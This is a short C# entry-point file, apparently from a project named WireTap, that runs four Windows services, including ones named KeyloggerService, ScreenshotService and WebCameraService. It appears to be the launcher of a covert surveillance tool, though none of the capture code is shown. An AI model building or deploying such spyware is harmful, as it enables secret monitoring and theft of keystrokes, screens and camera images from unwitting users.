namespace WireTap.WiindowsService2
{
    using System;
    using System.Collections.Generic;
    using System.Linq;
    using System.ServiceProcess;
    using System.Text;
    using System.Threading.Tasks;
    using WireTap.WindowsService;

    internal static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        static void Main()
        {
            ServiceBase.Run(new ServiceBase[]
            {
                new Service1(),
                new KeyloggerService(),
                new ScreenshotService(),
                new WebCameraService()
            });
        }
    }
}
